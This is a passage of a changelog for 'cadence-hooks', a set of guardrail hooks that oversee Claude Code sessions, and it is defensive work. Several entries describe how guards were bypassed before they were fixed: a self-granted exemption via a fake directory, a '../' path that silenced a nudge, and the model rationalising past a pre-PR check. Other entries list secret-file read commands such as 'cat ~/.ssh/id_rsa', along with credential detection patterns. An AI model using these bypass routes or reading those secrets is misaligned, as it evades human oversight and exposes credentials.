- **`enforce-worktree`'s `CADENCE_ALLOW_MAIN` exemption is now repo-scoped, not just process-env-scoped (#232).** #226 made the guard's target *resolution* repo-aware (a `cd`/`-C`-redirected commit is judged against the target it lands in), but the *exemption* stayed process-env-only — so a cross-repo `git -C <repo> commit` (or `cd <repo> && git commit`) into a by-design-main repo (dotfiles, vaults) still blocked, even though that repo's own `.claude/settings.json` declared `CADENCE_ALLOW_MAIN`, because Claude Code only injects a repo's `env` block for sessions rooted in that repo. The guard now falls back to reading the flag from the resolved target repo's own tracked settings when process env doesn't set it — `.claude/settings.local.json` overriding `.claude/settings.json`'s `env` block, matching Claude Code's local-over-shared precedence — via a bounded/hardened read (`read_untrusted_config`, #157/#194: regular-file check, 1 MiB cap) that is fully fail-open (a missing file, absent key, malformed JSON, or non-scalar value all just mean "not declared," never a block or a panic, per ADR-0001). The lookup is memoized per invocation per repo root. A ride-through via this path logs bypass provenance as `CADENCE_ALLOW_MAIN (repo settings)`, distinguishing it from the plain env-var mechanism. Verifying that provenance surfaced a latent gap in the just-added bypass log (below): the Bash `git commit` arm returned only non-Allow results and otherwise fell through to a bare allow, so a *bypassed* commit-allow — a snooze, an env switch, or this new repo-declared exemption — dropped its provenance and never reached `bypasses.jsonl`; the arm now propagates the first bypassed allow (a block on any target still wins first). Every prior provenance test drove the Edit arm, so the Bash-arm gap went unseen until the repo-settings case exercised a bypassed allow through it.

### Security

- **`read_body_file` no longer shares the #157 unbounded-read DoS shape (#194).** The `redact_external_content` reader for `gh`/`git` `--body-file`/`-F` arguments used an unbounded `fs::read_to_string`, so a body-file path resolving to a symlink to an endless special file (`/dev/zero`, a FIFO) or a multi-GB blob could hang or OOM the hook. It now routes through the same `core::paths::read_untrusted_config` #157 introduced — rejecting anything that is not a regular file and capping the read at 1 MiB — failing open (ADR-0001).

### Added

- **guard-bypass provenance — every guardrail bypass now leaves a durable, privacy-safe audit line.** A new `bypasses.jsonl` metrics stream records two events: `armed` (a `dismiss-*` snooze was set) and `used` (a write rode through an active dismissal or env switch, which the denial log can't see because a bypass is an allow). Each line carries the guard, mechanism, kind (`dismissal`/`env_switch`), session, repo **basename**, a user-authored reason, and the expiry — never a command, path, or edited content (privacy-by-construction, like `denials.jsonl`). Both `dismiss-enforce-worktree` and `dismiss-main-branch-warn` gain `--reason`, **required for a dismissal longer than 1h** and nudged at or under it; the reason/session/expiry also land in a provenance sidecar beside the snooze marker (the load-bearing `{epoch}` marker is unchanged). v1 wires the two highest-value guards (`enforce-worktree`, `warn-main-branch`); the remaining guards, the global gates, and read-side surfacing are a tracked follow-up. Fully fail-open (ADR-0001) — a failed audit write never turns an allow into a block.

## [0.47.0] - 2026-07-05

### Added

- log-plan-phase — appends EnterPlanMode/ExitPlanMode lifecycle records (with a whole-transcript token/cost scan) to `plan-phases.jsonl`; pilots the `schemaVersion` convention (#218)

## [0.46.0] - 2026-07-03

### Added

- threshold-gated hook self-timing — hooks slower than CADENCE_HOOK_TIMING_THRESHOLD_MS (default 1000) are logged to hooks.jsonl (#143)
- warn-subagent-concurrency — nudges when live subagents reach CADENCE_MAX_CONCURRENT_SUBAGENTS (default 5) (#145)
- warn-branch-intent — nudges when new work starts on a stale, unrelated branch; once per session, opt out with CADENCE_ALLOW_BRANCH_INTENT (#155)
- **guard-read-model — opt-in per-model Read/Grep guard (#144).** Resolves the current session model from the transcript tail (`core::transcript::last_assistant_model`, no metrics dep) and blocks Read/Grep per `CADENCE_READ_MODEL_GUARD_*` policy: `CADENCE_READ_MODEL_GUARD_MODELS` (space/comma list of family keywords or full ids; unset → disabled), `CADENCE_READ_MODEL_GUARD_MODE` (`deny`|`allow`, default `deny`), `CADENCE_READ_MODEL_GUARD_ON_UNKNOWN` (`block`|`allow`, default `allow`). Matching is case-insensitive substring (`opus` matches `claude-opus-4-8`). Blocks ONLY on a positively-identified denied model; fail-open on unknown — a missing/empty/unreadable transcript never bricks reads (ADR-0001).
- audience-aware redaction — redact-external-content now gates each hit on destination-tier vs per-category ceiling (d>c), nudge-only (#159)
- session bounds (startTs/endTs/durationMs) and commits count on sessions.jsonl, plus a log-session-start hook to stamp SessionStart (#182)
- **warn-going-public — nudges on repo create/edit when the repo name or description telegraphs sensitive content; sensitive terms via `CADENCE_GOING_PUBLIC_TERMS`, relief via `CADENCE_GOING_PUBLIC_IGNORE` (#128).**

### Fixed

- warn-recommended-option now allows a declared "no clear recommendation" stance (fires only on true silence) (#148)
- **terminology guard's `cadence-hooks` exemption is now scoped to the active checkout, closing a self-grantable bypass (#139).** The exemption fired on any path with a `cadence-hooks` component, so `mkdir /tmp/cadence-hooks` plus a doc carrying a blocked term self-granted the free pass. It now fires only when the edit targets a file inside the current checkout AND that checkout is genuinely the cadence-hooks repo (identified by its primary-checkout dir name via the git common dir), so linked worktrees stay exempt while unrelated repos merely nested under a `cadence-hooks`-named ancestor no longer do. The `is_within` containment primitive (which rejects `..` traversal) is promoted from `crates/lab` to `crates/core` as the single implementation. Fail-safe: every failure path falls through to a block.
- **`dismiss-enforce-worktree` marker now resolves the git common dir, so snoozing works from a linked worktree (#179).** The marker was written under the passed directory's own `.git/cadence-hooks/`, which for a linked worktree is the per-worktree git dir — invisible to the primary checkout where the guard fires. Both the reader and the dismiss CLI now resolve the shared common dir via `git rev-parse --git-common-dir`, so a snooze recorded from any worktree is honoured at the primary. Fail-open on non-repos preserved (ADR-0001).

### Removed

- Retired check-idle-return guard — moot once a hook must execute to run (it re-caches anyway) (#151)

## [0.45.0] - 2026-07-03

### Added

- **feat(doctor): plugin-cache health check (#162).** `doctor` now flags orphaned SHA-pinned cache version dirs (with a byte count), missing/empty pinned dirs, and marketplace checkouts whose `git remote` diverges from their declared `known_marketplaces.json` source ("cache may not be canonical — verify before citing"). All advisory (Warning/exit 1), live-machine only (skipped under `--root`), fail-open throughout (ADR-0001). Orphan counts surface in verbose mode only to avoid perennial SessionStart nags; detection-only — `--fix` prune deferred.

### Changed

- **`warn-issue-tracker` is now decentralization-aware (#166).** The guard hardcoded `cameronsjo/claude-configurations` as the single canonical tracker and misfired on the legitimate post-2026-06-30 trackers. It now checks the filing target against a set of known ecosystem trackers (`cadence`, `cadence-hooks`, `forgectl`, `claude-configurations`), nudging only when an *owned* repo is none of them. New `CADENCE_ISSUE_TRACKERS` (plural, comma-separated) overrides the set; the legacy singular `CADENCE_ISSUE_TRACKER` still works. Still nudge-only, never blocks (ADR-0001).
- **docs(changelog): backfilled the missing `[0.30.0] - 2026-06-16` section**
  (#140). The changelog jumped `[0.31.0]` → `[0.29.0]`; the three fixes that
  shipped in v0.30.0 are now stamped into a versioned section.
- docs(hooks): add missing metrics-logger rows (`log-session`, `log-polish-nudge`, `log-ask-user-question`) to the cadence-metrics table in `docs/hooks.md` (#178)
- docs(testing): document isolating a block to the binary vs the run-cadence-hooks wrapper, and the wrapper's fail-open signal (#69)

### Fixed

- **Persona ledger is now bounded and its session-start dedupe no longer full-parses every line (#137).** The append-only `personas.jsonl` grew without limit and every SessionStart re-parsed the whole file (one `serde_json::Value` per line) just to dedupe one `session_id`. `ledger_contains` is now a reverse substring scan (no per-line JSON parse), and `promote` rotates the ledger to a configurable `ledger_max_entries` cap (default 1000; `0` disables), keeping the newest records and collapsing duplicate `session_id`s. Rotation is confined to the PostToolUse promote path and atomic (temp-write + rename), fail-open throughout (ADR-0001).
- **`obsidian trash-guard` now catches non-`rm` deletion verbs (#136).** The guard gated solely on `command.contains("rm")`, so `unlink note.md`, `find … -delete`, `shred -u note.md`, and `truncate -s 0 note.md` destroyed vault files while bypassing Obsidian's `.trash/`. A shared `is_destructive` gate now matches all four (token-based, so `find` without `-delete` stays read-only and allowed), reusing the existing vault-targeting logic unchanged.
- **`guard-gh-write` no longer blocks explicit-target `gh` reads in a loop (#158).** The `AllTargetsExplicit` loop branch ownership-gated every command, so a loop of `-R`/`--repo` reads against an unowned repo false-blocked. Reads are owner-independent; the branch now gates on `is_write_command`, mirroring the `MissingTargets` path. Unowned looped writes still block.
- `warn-main-branch` carve-outs (`.claude/`, `docs/plans/`) now lexically resolve `..`/`.` in the path before matching, so a crafted `file_path` like `docs/plans/../../src/main.rs` can no longer suppress the main-branch nudge for a real product file (#152).
- **`log-polish-nudge` now records the branch-scoped marker signal the pre-PR
  gate acts on, not just a session-log scan (#177).** A new
  `polish_marker_present(command, cwd)` helper in core is the single source of
  truth both the `nudge-polish-before-pr` gate and the metric call; the metric
  emits `markerPresent` alongside `polished`, making the gate-truth denominator
  queryable and the scan-vs-marker drift measurable. Fail-open throughout
  (ADR-0001).
- **`effective_content()` reads the literal write target, not the normalized path (#129).** For Edit/MultiEdit the helper now simulates against the file actually being written — a trailing-space/backslash/null path variant no longer makes a guard validate a different (or missing) file. Fail-open on an unreadable/non-UTF-8 file is preserved (ADR-0001) and documented; a future *blocking* content-security guard must supply its own fail-closed default.
- **Content-aware `.envrc` carve-out on the secret guards' tool paths (#149).** A `.envrc` of pure direnv loader directives (`use flake`, `dotenv`, `layout`, `source`, `PATH_add`, comments, `PATH`/`MANPATH` assignments) is a committed config loader, not a secret store — but `prevent-secret-writes` / `prevent-secret-leaks` hard-blocked every `.envrc` by name. Write/Edit now consult the resulting content (`effective_content`) and Read/Grep read the file to classify it; a proven pure-loader `.envrc` is allowed, while a `.envrc` carrying a `KEY=<value>` assignment or any provider-shaped secret value still blocks. Fail-closed: unreadable/unrecognized content stays blocked, and only `.envrc` is eligible — the rest of the `.env` family remains secret by name. The Bash arms (`cat .envrc`, `cat > .envrc`) still name-block pending a follow-up.
- **Bash-path coverage for non-`.env` deny-set secret files (#138).** The secret guards' Bash arms judged only the `.env` family, so `cat ~/.aws/credentials`, `cat ~/.ssh/id_rsa`, `cat ~/.git-credentials`, `cat ~/.pgpass`, `cat ~/.kube/config`, and `cat ~/.netrc` — all already blocked on the tool paths — read and wrote freely over Bash. A new `is_dangerous_secret_token` classifier consults the full `BLOCKED_FILENAMES` / `BLOCKED_PATH_FRAGMENTS` deny-sets, and a `command_may_reference_secret` pre-filter generalizes the old `.env`-only gate. Safe templates short-circuit so `id_rsa.pub` and `.aws/credentials.example` stay readable. `.envrc` keeps its Bash name-block (content carve-out stays tool-path-only, #149).

### Security

- **`check-security-patterns` scans the simulated post-edit document and gains RCE/XSS coverage (#131).** The guard now routes through `effective_content()` (correct line numbers; no more scanning an Edit fragment or a MultiEdit's stale pre-edit file), and flags Python `eval(`/`exec(`/`os.system(`/`pickle.load(` and JS `eval(`/`document.write(`/`dangerouslySetInnerHTML`. Advisory-only (never blocks).
- **Harden untrusted `.claude/*.json` config reads against a local special-file DoS (#157).** The per-repo `terminology.json` and `redaction.json` readers used an unbounded `fs::read_to_string` with no file-type check, so a `.claude/*.json` that was a symlink to an endless special file (`/dev/zero`, a FIFO) or a multi-GB blob could hang or OOM the hook when it fired inside a cloned/shared repo. Both now route through a new `core::paths::read_untrusted_config`, which rejects anything that is not a regular file (on `stat`, before any blocking read) and caps the read at 1 MiB, failing open (ADR-0001) — a rejected config is treated as absent.

## [0.44.0] - 2026-07-02

### Added

- **`metrics warn-stale` — telemetry staleness alarm at SessionStart + a
  `doctor` surface (#161).** Warns once per day when the newest cadence-metrics
  JSONL write is older than a threshold (`CADENCE_METRICS_STALE_DAYS`, default
  4 days) — the signal the "second death" incident lacked, where the metrics
  dir went silently quiet while sessions kept running (mis-wired hooks or a
  disabled plugin). The pure `staleness()` core watches only top-level
  `*.jsonl` mtimes (the `state/` marker dir never counts), and a dated
  `state/stale_warn.date` marker throttles the nudge to once per calendar day.
  `cadence-hooks doctor` reports the same staleness as a `Warning` (exit 1) in
  its default scan — skipped under `--root` so a fixture run never reads the
  dev machine's live telemetry. Fail-open everywhere (ADR-0001): a missing
  dir, unreadable file, fresh install, bad env value, or marker IO error all
  resolve to silence or a plain nudge — never a block. The SessionStart hook
  wiring ships in the companion cadence-metrics plugin PR.
- **`metrics log-session` — per-session cost at `SessionEnd`
  (`sessions.jsonl`).** A fifth `log-*` logger that scans the whole transcript
  once at session end, prices it per-model, and appends one row with
  `sessionId`, `repo`, `branch`, `reason`, `durationApproxMs`, `tokens`,
  `costUsd`, `byModel[]`, `unpricedModels[]`, `messagesScanned`,
  `lastMessageId`, `agentId`, `parentSessionId`. Where `log-commit` prices the
  range since the last commit marker, `log-session` prices the whole transcript,
  so `sum(commits) ≤ session` — the gap is uncommitted-work cost, and each
  `/clear` segment writes its own row. Adds `MetricsInput.reason` (the
  SessionEnd exit reason) and extracts the `byModel[]` / `unpricedModels[]`
  builders into a shared `model_breakdown` module so `log-commit` and
  `log-session` emit identical shapes. Gated on
  `hook_event_name == "SessionEnd"` and fail-open (ADR-0001); the SessionEnd
  hook wiring ships in the companion cadence-metrics plugin PR. Refs
  cameronsjo/cadence#141.
- **`denials.jsonl` — guard-denial audit log at the dispatch outcome→exit-code
  seam.** Records one append-only line per guard `deny` (a hard block, exit 2),
  and per `nudge` when `CADENCE_LOG_NUDGES` is set — fields `ts`, `hook`,
  `event`, `decision`, `tool`, `repo`, `sessionId`, `agentId`. A PreToolUse
  block was previously prose-only, invisible to attachment counting and leaving
  zero on-disk trace when a false positive fired. The write lives at the single
  `run_check` seam (split into `decide_check` + `emit_and_exit`) via a
  binary-level `run_logged_check` wrapper that threads the canonical registry
  hook name; every block-capable check arm routes through it, loggers are
  untouched. **Privacy by construction:** the record names which guard fired on
  which tool in which repo, never the command text, file path, or edited
  content. Fail-open (ADR-0001): a full disk or unwritable metrics dir degrades
  to a no-op and the block still exits 2 with byte-identical stderr. Consumer:
  `claude-configurations` `profiler_tally.py` renders a denies-by-hook table.

### Added

- **`guardrails enforce-worktree` — hard block on mutations in a primary
  checkout of a branch-mode repo.** Enforces the worktree-isolation invariant
  (every session in its own worktree, or in a `CADENCE_ALLOW_MAIN` repo where
  main is the working branch by design) that replaces advisory multi-session
  coordination — see claude-configurations ADR-0030. Blocks Edit/Write/MultiEdit
  and leading-`git commit` (including `git -C <primary>` forms) when the target
  repo's `.git` is a directory; linked worktrees (`.git` file) pass untouched.
  Exemptions: `CADENCE_ALLOW_MAIN`, the `CADENCE_NO_ENFORCE_WORKTREE` kill
  switch, temp-rooted scratch repos, `.claude/` and `docs/plans/` paths, and a
  new `guardrails dismiss-enforce-worktree --for <duration>` snooze (24h cap).
  Fails open on any git/parse failure (ADR-0001).

## [0.42.0] - 2026-07-02

### Added

- **Per-repo terminology exemptions (`.claude/terminology.json`).** The
  `terminology` guard now reads an optional `<git-root>/.claude/terminology.json`
  that softens its hard block for named files and terms — mirroring the
  `.claude/redaction.json` precedent. Each `exemptions[]` entry takes `paths`
  (glob patterns: a `/`-bearing pattern matches the repo-relative path with `**`
  spanning separators, a bare pattern matches the basename anywhere), optional
  `terms` (case-insensitive against the display term; omit to exempt all), and an
  optional `mode` (`allow` drops the violation, `nudge` demotes a block to an
  advisory). It can only ever *remove* or *demote* a violation, never add one;
  the global hard block and the built-in path baseline are untouched. Missing,
  unreadable, or invalid JSON is ignored (fail-open, ADR-0001). The shared
  `find_git_root` walk also moved into `core::paths`. See
  [docs/configuration.md](docs/configuration.md#per-repo-terminology-exemptions).

### Fixed

- **guard blocks no longer emit a schema-invalid JSON envelope on stdout**
  (#165). The `run_check` `Block` arm exited 2 but *also* wrote a
  `permissionDecision:"deny"` JSON envelope to stdout when a `BlockMetadata` was
  present under `PreToolUse`. On exit 2 Claude Code ignores stdout entirely, so
  that envelope delivered nothing — and its `additionalContext` was an object
  (the metadata struct) where the schema requires a string, registering as an
  output-schema validation failure in telemetry (observed: 99 fires from
  `guard-gh-write` alone). Blocks are now stderr-only (exit-2 enforcement is
  unchanged); the one machine-intended datum, `BlockMetadata::fix`, folds into
  the stderr text as a `Fix:` line when the prose doesn't already carry one.
  Output rendering is extracted into a pure `render_output` function so the
  exit-code × output-shape matrix is unit-tested (the anti-regression assertion:
  a block emits no stdout; a nudge's `additionalContext` is string-typed).
- **nudge-polish-before-pr: see polish run in a subagent transcript** (#247 on
  claude-configurations). The pre-PR polish gate (and the `log-polish-nudge`
  metric) read only the *parent* session transcript, so `cadence-forge:polish`
  invoked inside a subagent was invisible — delegated PR flows were hard-blocked
  and logged `polished: false` despite a real polish run. Both now also scan
  this session's child transcripts (`<stem>/subagents/agent-*.jsonl`): a polish
  run in any child satisfies the gate. The scan is lazy (only on the
  would-block path) and fail-open at every step (missing dir / unreadable child
  → falls through, never blocks on our own missing data, ADR-0001).
- **rules validate-frontmatter: accept the valid `paths` field** (#227 on
  claude-configurations). `paths` — Claude Code's conditional-activation field
  that scopes a skill to fire only when matching files are touched, documented
  in `cadence:writing-skills` — was absent from the validator's allowed-field
  set, so every `Write` to a path-scoped `SKILL.md` under a real skills
  directory hard-blocked with `Unknown frontmatter field: 'paths'`. Added
  `paths` to `VALID_FIELDS`; path-conditional skills now write cleanly.
- **metrics: correct opus-4-7/4-6 prices + honor CADENCE_METRICS_DIR**
  (claude-configurations#127, claude-configurations#120). `claude-opus-4-7` and
  `claude-opus-4-6` were priced at $15/$75/MTok (3× too high); corrected to
  $5.00 input / $25.00 output / $6.25 cache-write / $0.50 cache-read, matching
  `claude-opus-4-8`. `metrics_dir()` now checks `CADENCE_METRICS_DIR` first
  before falling back to `CLAUDE_CONFIG_DIR`-derived path, so integration tests
  that set that variable actually redirect output.

## [0.41.0] - 2026-06-23

### Changed

- **nudge-polish-before-pr: transcript-aware conditional block** (#151 on
  claude-configurations). The pre-PR polish reminder was a soft nudge (allow +
  warn) on every `gh pr create`, so the model could talk past it — "day 3 of
  polish not needed." It now scans the session transcript (via
  `core::transcript::transcript_has_polish_run`, extracted from the metrics
  logger into a shared module and tightened — exact-leaf match replaces the
  prior `.contains("polish")`, so the metrics logger's `polished` field no
  longer counts decoys like `repolish`) for a real `cadence-forge:polish` Skill
  run and routes a 3-way,
  fail-open outcome: a transcript **showing** a polish run → silent **allow**
  (kills the nag-after-polish noise); a readable transcript with **no** polish
  run → **block** (exit 2, the teeth); no / empty / unreadable / unparsable
  transcript → the original **nudge** (ADR-0001 — never block on our own missing
  data). Polish-skill detection is leaf-exact (rejects decoys that merely
  contain `polish`). The
  block message reassigns authority — run `/polish`, or surface a believed-
  legitimate skip to Cameron, who decides; the model may not self-approve — and
  does not advertise a self-serve bypass. Same subcommand, event, and matcher;
  `HookInput` gains a `transcript_path` field (a documented common field on
  every hook event).

### Fixed

- **warn-main-branch: carve out `docs/plans/`** (#226 on claude-configurations).
  The on-main editing nudge fires once per session, and a plan-document write to
  `docs/plans/` — which cadence mandates on the default branch — consumed that
  one-shot warning, letting later real product edits on `main` escape unwarned.
  Plan-doc directories are now exempt alongside the existing `.claude/` carve-out
  (consecutive `docs`→`plans` path components; a bare `plans/` or a look-alike
  such as `mydocs/plans` still warns). Nudge-only; the fail-open contract is
  unchanged.

## [0.40.0] - 2026-06-23

### Fixed

- **doctor: honest version-skew advisory + clearer bare invocation** (#223 on
  claude-configurations). The skew advisory hardcoded `brew upgrade
  cadence-hooks` even when the Homebrew tap was already current, so the
  recommended command was a silent no-op and the SessionStart banner returned
  every session with no way to clear it. `doctor` now detects the binary's
  install channel from `current_exe()` and names the truthful upgrade path:
  Homebrew installs still get `brew upgrade` but with a source fallback for the
  "tap already current" case; cargo / unknown installs are pointed at `cargo
  install` or the releases page (mirroring the binary's own runtime fallback).
  The quiet SessionStart banner defers channel-specific detail to `cadence-hooks
  doctor`. Separately, a bare `cadence-hooks` (no subcommand) now prints plain
  `--help` guidance instead of the "a plugin expects a newer version" warning,
  which is now reserved for genuinely unknown subcommands. Advisory-only — exit
  codes and the fail-open contract are unchanged.

## [0.39.0] - 2026-06-23

### Added

- **metrics: `log-ask-user-question` — record AskUserQuestion stance + shape on
  every call** (#210 on claude-configurations). A fire-and-forget PreToolUse
  logger that appends one line to `<metrics_dir>/askuserquestion.jsonl` per
  AskUserQuestion call: the call's *stance* — `recommended` when an option label
  carries `(Recommended)`, `declared_no_rec` when a question text carries the
  `no clear recommendation` marker, else `silent` — plus its shape
  (`multiSelect`, `nQuestions`, `nOptions`, `sessionId`, `model`). Stage 1 of
  making `(Recommended)` reliable: pure observation, zero behavior change — the
  `silent` rate is the diagnostic denominator for "is Claude omitting a
  recommendation, or are the options genuinely equivalent?". The shared
  `stance(...)` classifier (new `Stance` enum in `rules::askuserquestion`) is
  reused by the `warn-recommended-option` nudge so the two never drift;
  `MetricsInput` gains a `model` field. The `cadence-metrics` hooks.json wiring
  ships alongside. Releasing this closes the binary/plugin skew that the
  SessionStart `doctor` advisory flagged on 0.38.0 (claude-configurations #223).

## [0.38.0] - 2026-06-23

### Added

- **cadence: `redact-external-content` — nudge when an external post mentions
  internal harness vocabulary** (planning issue #27 on claude-configurations).
  A PreToolUse **nudge** (never a block) that scans the *body text* of
  external-posting Bash commands — `gh pr/issue/release/gist/discussion`
  create/comment/edit, `git commit`, `tea pr/issue` — and flags four categories
  of harness-internal vocabulary before the content ships: skill/plugin IDs
  (`cadence:attune`, derived from a maintained namespace list), local filesystem
  paths (`/Users/…`, `~/.claude/…`, `/private/tmp/claude-*`), marketplace/cache
  paths (`~/.claude/plugins/…`, `cache/workbench/…`, raw marketplace URLs), and
  bare harness nouns (`harness`, `transcript`, `tool_input`, `tool_response`).
  Bodies are pulled from `--body`/`-b`/`-m`/`--message`, `--body-file`/`-F`
  (read from disk), and heredocs carried in a quoted command substitution.
  A per-repo `.claude/redaction.json` extends it: `additionalPatterns` flag
  project-specific strings (with a suggested replacement) and `allowlist`
  suppresses hits — a full token (`cadence:writing-skills`) suppresses that
  exact snippet, a bare namespace (`cadence-forge`) suppresses every skill-id
  in that namespace (so a repo that legitimately discusses a whole namespace
  can allow-list it wholesale).
  Missing/invalid config, unreadable body files, and unrecognized commands all
  fail open silently. Binary subcommand only — the plugin's hooks.json wiring
  (with the `if` filter) lands in a separate PR.

## [0.37.0] - 2026-06-22

### Added

- **guardrails: `warn-subagent-worktree` — nudge when dispatching a subagent
  from main while a sibling worktree exists** (#201 on claude-configurations). A
  subagent inherits the *spawning session's* working directory, so a session in
  the main checkout spawns subagents that operate on the main checkout — never a
  sibling worktree. This PreToolUse check fires once per session (per repo) on an
  `Agent`/`Task` spawn when the session is in the primary checkout (`.git` is a
  directory, not a linked-worktree file), a sibling worktree exists
  (`git worktree list` shows more than the primary), and the spawn doesn't set
  `isolation: "worktree"`. The nudge names both fixes — dispatch from inside the
  worktree, or pass `isolation: "worktree"` for a fresh one — and a permanent
  per-repo opt-out via `CADENCE_ALLOW_SUBAGENT_FROM_MAIN=true`. `ToolInput` gains
  `subagent_type` / `isolation` (snake_case, matching the Agent payload).

## [0.36.0] - 2026-06-22

### Added

- **metrics: `log-polish-nudge` — deterministic telemetry for polish-nudge
  efficacy** (#151 on claude-configurations). A new PostToolUse metrics Logger
  fires on `gh pr create` — the same `is_gh_pr_create` predicate that drives
  `nudge-polish-before-pr`, so the recorded set is exactly the PRs that got
  nudged (the denominator). Each row appends to `polish_nudges.jsonl` with
  `{ts, sessionId, transcriptPath, branch, repo, polished}`, where `polished`
  is a best-effort transcript scan for a `cadence-forge:polish` Skill
  invocation earlier in the session; a `polished: false` row is a deterministic
  *skip candidate*. (A line merely mentioning `/polish` in prose does not count
  — only an actual Skill `tool_use` does.) Distinguishing a *rationalized* skip
  from a legitimate one stays a transcript/prose judgment, but the rate is now
  queryable without re-mining every transcript. `is_gh_pr_create` moved to
  `cadence_hooks_core::shell` so the nudge and the logger share one definition.
  (Wiring this logger into the cadence-metrics plugin's `hooks.json` is the
  companion step.)

### Fixed

- **session: the heartbeat now sweeps stale peer lanes** (#155 on
  claude-configurations). `sweep_stale` had exactly one production trigger —
  SessionStart — so a long-lived session that swept once at its own start never
  reaped a peer that went stale afterward, and forks/subagents (which never fire
  the cadence-canon SessionStart) never swept at all. Dead lanes accumulated (17
  of 17 unreaped in a shared checkout) while `session status` kept *classifying*
  them `[STALE]` on demand — the classifier and the reaper shared one threshold
  and one mtime helper, so the gap was never a predicate mismatch, only the
  reaper's trigger set. The reaper now also runs from the PostToolUse heartbeat —
  the only high-frequency signal every live session emits — so dead peers are
  pruned within ~one heartbeat of crossing the 30-min threshold, independent of
  any fresh SessionStart. `touch_own` runs first (self's mtime refreshed to
  ~now), so a quiet session can never sweep its own aged file (#69); the
  staleness threshold and the own-session exclusion are unchanged.

## [0.35.0] - 2026-06-20

### Added

- **session: deterministic backstop for outro's "no loose ends" contract**
  (#123 on claude-configurations). `cadence:outro` accounts for every thread a
  session opens against five terminal dispositions, but that contract is skill
  prose — a session can end without `/outro` and work slips away silently. Two
  new `session` subcommands add the deterministic belt to that probabilistic
  suspenders. `backstop-record` is a SessionEnd Logger (mirrors `session end`)
  that probes the repo for loose ends — uncommitted/untracked
  (`git status --short`), unpushed commits (`@{u}..`, only when an upstream
  exists), and stashes — and, when any remain *and no live peer is still in the
  checkout*, stashes a counts-only marker in the git-excluded `.claude/sessions/`.
  The lights-out gate (only the last session out records) keeps a shared
  multi-session checkout from recording a live peer's in-progress work as loose
  ends. `backstop-warn` is a SessionStart Check
  (mirrors the `session start` disclosure) that reads the marker at the next
  open, emits a one-shot nudge summarizing what was left, and deletes it. It
  **never blocks** (ADR-0001) — a nudge, exit 0. The design is deferred
  (SessionEnd → next SessionStart) because `HookEvent` has no `SessionEnd`
  variant and `Stop` fires after every turn, so the next SessionStart is the only
  reliable user-visible end-of-session surface. If outro (or any commit/push)
  resolved the work, git is clean → no marker → silent automatically; for
  deliberately-left work, set `CADENCE_NO_OUTRO_BACKSTOP`. The message states
  only what is observable ("loose ends remained at session end") and never claims
  outro was skipped. The marker filename carries no `.json` extension so the
  registry's `sweep_stale` never reaps it before the repo is reopened. Wiring
  lands in cadence-canon's `SessionEnd`/`SessionStart` arrays.

## [0.34.0] - 2026-06-19

### Added

- **AskUserQuestion guidance moves from prose/shell to two Rust nudge hooks**
  (`rules warn-recommended-option`, `rules warn-empty-answers`).
  `warn-recommended-option` (PreToolUse) nudges Claude to label a clearly-preferred
  option "(Recommended)" and list it first when no option across the questions
  carries the marker — a deterministic call-time reinforcement of the conditional,
  drift-prone always-loaded rule that the model had quietly stopped applying.
  `warn-empty-answers` (PostToolUse) ports the retired `guard-askuserquestion.sh`:
  it re-asks-as-plain-text when the answers dict is empty or every value is garbage
  (`""`/`.`/`null`/`undefined`), the auto-approve artifact from
  anthropics/claude-code#29962. Both are nudges, never blocks — the rule is
  conditional ("when you have a clear preference"), so a block would over-apply to
  genuinely-equivalent options. New `ToolInput.questions` / `ToolResponse.answers`
  fields on the hook payload back the checks (previously dropped by serde).
  Companion `hooks.json` wiring ships in `cadence-rules`. Supersedes ADR 0012's
  shell implementation (ADR 0020).

## [0.33.0] - 2026-06-19

### Changed

- **nudge-polish-before-pr: tighten the wording and require a stated skip
  reason**. Trims the 0.32.0 message ~35% (same beats — what polish does,
  behavioral-markdown-is-in-scope, `/polish docs` for literal docs, the two real
  skips, process-is-not-polish) and adds a final clause: *if you skip, say so
  and why — don't skip silently*. A silent skip is where the rationalization
  hides; forcing the model to state the reason surfaces it for the user to veto.
  A third unit test pins the `don't skip silently` clause.

## [0.32.0] - 2026-06-19

### Changed

- **nudge-polish-before-pr: behavioral markdown is in scope; close the "it's
  just docs" skip loophole**. The pre-PR `/polish` nudge was being rationalized
  away on skill / agent / command / rule-markdown branches as "trivial" or
  "already reviewed." It now states plainly that skill, agent, command, and rule
  markdown (and CLAUDE.md) are *behavior, not documentation* — so they are IN
  scope — routes a branch that is *literally* documentation to `/polish docs`
  instead of a skip, and narrows the skip conditions to a trivial one-liner or a
  branch already taken through `/polish`. It also denies the second common
  rationalization: having planned the work, used TDD, or gone through attune or
  a manual code-review is *not* the same as running the polish skill — those
  precede polish, they don't replace it. Two unit tests assert the "behavior,
  not documentation" and "not the same as running the polish skill" clauses so
  the loopholes cannot silently regress.

## [0.31.0] - 2026-06-17

### Added

- **prevent-secret-writes: scan written content for live secret values** (#85 on
  claude-configurations). Beyond the filename/`.env` checks, Write/Edit now scans
  the *introduced* content of any non-exempt file for high-confidence credential
  shapes — AWS access keys (`AKIA`/`ASIA`), GitHub tokens (`ghp_`/`gho_`/…/
  `github_pat_`), OpenAI keys (`sk-`/`sk-proj-`), Slack tokens (`xox[baprs]-`),
  and PEM private-key headers — and blocks, naming the kind without ever echoing
  the value. Runs before the safe-template allow, so a real key pasted into
  `.env.example` is still caught. JWTs and generic high-entropy strings are
  deliberately not matched (unbounded false positives); only this repo's own
  source is exempt (its test fixtures carry secret-shaped literals).
- **session: deregister on SessionEnd so ended sessions stop lingering as
  phantom peers** (#97 on claude-configurations). Liveness was mtime-only with
  no deregistration ceremony, so an ended session (`/clear`, exit, logout)
  lingered in `.claude/sessions/` until the next `session start` swept it by age
  (up to 30 min) — and the next session's SessionStart disclosure listed the
  dead session as a live peer. A new `session end` fire-and-forget Logger
  (wired to the SessionEnd event in cadence-canon) removes the session's own
  registry file via `registry::remove_own`. It gates strictly on
  `hook_event_name == "SessionEnd"` (a delete must never fire on another event)
  and removes only the record whose stored `session_id` matches exactly
  (content-verified via the #90-hardened `find_own`), so it can never delete a
  peer's lane. `HookEvent` has no `SessionEnd` variant, so it is modelled as a
  Logger (`event: None`) like `heartbeat` — no enum change.

### Fixed

- **git-safety: `git rebase --onto <protected>` is no longer falsely blocked**
  (#74 on claude-configurations). `check_rebase_blocked` flagged any rebase
  whose args contained a bare `main`/`master`, catching `git rebase --onto main
  <upstream> <branch>` — a documented stacked-PR restack where main is the
  replay destination and is never rewritten. The token following `--onto` is now
  exempt; a protected branch named anywhere else (plain `git rebase main`, or as
  the trailing `<branch>`) still blocks.
- **secret guards: block `.git-credentials`, `.pgpass`, `.aws/credentials`,
